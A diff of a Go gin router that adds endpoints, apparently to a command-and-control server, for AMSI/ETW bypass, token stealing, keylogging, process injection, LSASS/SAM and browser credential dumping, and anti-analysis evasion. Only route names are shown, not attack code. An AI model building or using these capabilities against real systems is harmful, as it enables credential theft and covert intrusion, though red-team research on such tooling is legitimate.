@@ -99,6 +99,50 @@ func (r *Router) Setup() *gin.Engine {
 		v1.POST("/agent/:id/timestomp", r.handlers.Timestomp)
 		v1.POST("/agent/:id/process/ppid", r.handlers.PPIDSpawn)
 
+		// Phase 3 — AMSI/ETW bypass
+		v1.POST("/agent/:id/bypass/amsi", r.handlers.AMSIBypass)
+		v1.POST("/agent/:id/bypass/etw", r.handlers.ETWBypass)
+
+		// Phase 3 — Token manipulation
+		v1.POST("/agent/:id/token/list", r.handlers.TokenList)
+		v1.POST("/agent/:id/token/steal", r.handlers.TokenSteal)
+		v1.POST("/agent/:id/token/make", r.handlers.TokenMake)
+		v1.POST("/agent/:id/token/revert", r.handlers.TokenRevert)
+
+		// Phase 3 — Reconnaissance
+		v1.POST("/agent/:id/screenshot", r.handlers.Screenshot)
+		v1.POST("/agent/:id/keylog/start", r.handlers.KeylogStart)
+		v1.POST("/agent/:id/keylog/dump", r.handlers.KeylogDump)
+		v1.POST("/agent/:id/keylog/stop", r.handlers.KeylogStop)
+
+		// Phase 4 — Advanced injection
+		v1.POST("/agent/:id/inject/hollow", r.handlers.Hollow)
+		v1.POST("/agent/:id/inject/hijack", r.handlers.Hijack)
+		v1.POST("/agent/:id/inject/stomp", r.handlers.Stomp)
+		v1.POST("/agent/:id/inject/map", r.handlers.MapInject)
+
+		// Phase 5 — Credential access
+		v1.POST("/agent/:id/creds/lsass", r.handlers.LSASSDump)
+		v1.POST("/agent/:id/creds/sam", r.handlers.SAMDump)
+		v1.POST("/agent/:id/creds/browser", r.handlers.BrowserCreds)
+		v1.POST("/agent/:id/creds/clipboard", r.handlers.ClipboardRead)
+
+		// Phase 6-7 — Evasion
+		v1.POST("/agent/:id/evasion/sleep", r.handlers.SleepObf)
+		v1.POST("/agent/:id/evasion/unhook", r.handlers.UnhookNTDLL)
+
+		// Phase 8 — Hardware breakpoints
+		v1.POST("/agent/:id/evasion/hwbp/set", r.handlers.HWBPSet)
+		v1.POST("/agent/:id/evasion/hwbp/clear", r.handlers.HWBPClear)
+
+		// Phase 9 — BOF execution
+		v1.POST("/agent/:id/bof", r.handlers.BOFExec)
+
+		// Phase 10 — OPSEC
+		v1.POST("/agent/:id/opsec/antidebug", r.handlers.AntiDebug)
+		v1.POST("/agent/:id/opsec/antivm", r.handlers.AntiVM)
+		v1.POST("/agent/:id/opsec/timegate", r.handlers.TimeGateSet)
+
 		// Monitoring
 		v1.GET("/stats", r.handlers.GetStats)
 		v1.GET("/health", r.handlers.HealthCheck)
